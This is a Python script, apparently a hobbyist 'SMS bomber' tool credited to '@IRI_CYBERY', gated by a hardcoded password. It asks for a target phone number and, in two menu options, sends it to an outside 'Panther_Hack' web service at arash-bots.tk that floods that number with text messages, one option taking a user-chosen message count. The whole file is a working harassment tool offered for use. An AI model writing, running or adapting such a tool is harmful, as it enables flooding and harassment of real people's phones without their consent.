#!/usr/bin/python3.0.8


# Coded By Python (3.8.0)


# Select Server 


#$ Need  Library !!

import requests

import time

import os

#$ set color name

#! color == black

black   =  '\033[0;30m'

#! color == red

red     =  '\033[0;31m'

#! color == green

green   =  '\033[0;32m'

#! color == yellow

yellow  =  '\033[0;33m'

#! color == blue

blue    =  '\033[0;34m'

#! color == magenta

magenta =  '\033[0;35m'

#! color == cyan

cyan    =  '\033[0;36m'

#! color == whit

whit    =  '\033[0;37m'


# End Set Color !!


# version 1.2.0

print ("\a")


os.system (" figlet Spam  -  Sms ")


print ("")

print ("")

time.sleep (5)

os.system ("clear")


print ("                                              $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                     ")
print ("                                              $$$$%%%%%%$$$$ #~ Spam-Sms ~# $$$$$$$%%%%%%$$$                                     ")
print ("                                              $$$$~   ~ $$ Coded By @IRI_CYBERY $$ ~   ~$$$$                                     ")
print ("                                              $^^^^^%^^$!~ > By Python 3.0.8 < ~!$^^^^%^^^^$                                     ")
print ("                                              $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                     ")


password = input (cyan + " Enter Script Password >> " + whit )

if password == '404 Not Found':

    print ( green + " Good ; Password Ok  !! " + whit )


    select = int (input ( blue + """\n                        [+].1- SmS-BoMber

                            [+].2- SmS-BoMb

                            [+].3- Exit

                            Enter Server or Exit :  >> """ + whit ))

    # Server 1

    if select == 1:

        print ("\a")

        # $Get Target Number !!

        number = input ( yellow + "\nEnter Target Number:(example > 0917....) >> " + whit )


        print ( green + " Number Enterede Secusasful !! " + whit )

        req = input ( red + " Are You Sure To Contnue ? (y/n) " + whit )

        if req == 'y':

            # $Api Url !!

            Response = requests.post ('https://arash-bots.tk/Webservice/Panther_Hack/SmS-BooMber.php',


            data = {'number': number})


            # $Print Response !!

            print ("Response : >> ", Response )

        if req == 'n':

                # exit as script

                input ( yellow + " Perss Any Key To Exit >> " + whit )

                exit ()

    # $Server 2

    if select == 2:

        print("\a")

        # $Get Target Number !!

        mobile = input( green + "\nEnter Target Number:(example > 0917....) >> " + whit )

        print ( cyan + " pls wait ... " + whit )

        print( green + " Number Enterede Secusasful !! " + whit )

        # $Get Count For Sends SmS

        count = int (input ( magenta + " Enter Count For Sends Sms To Target >> " + whit ))

        req = input( red + " Are You Sure To Contnue ? (y/n) " + whit )

        if req == 'y':

                # $Api Url !!


                Response = requests.get ('http://arash-bots.tk/Webservice/Panther_Hack/SmS-BoMb.php?',{'mobile':mobile , 'count':count})

                # $Print Response !!

                print ("Response : >> ", Response )

                input ( yellow + "Press Any Key To Exit >> " + whit )

                exit ()

    # $selected = exit (3)


    if select == 3:

        os.system ("clear")

        input ( yellow + " Press Any Key To Exit ... " + whit )

        print ( magenta + " Good Luck *_* " + whit )

        print ( green + " pls For Exit Wait 3 sec !! " + whit )

        time.sleep (4)

        exit ()



if password != '404 Not Found':

    print ( red +" Invalid Password ! ! ! " + whit )
   
    print ("whait 5 sec f0r Exit as Script")

    time.sleep (6)

    input ( magenta +"Enter Any Key To Exit . . . " + whit )
  
    exit ()
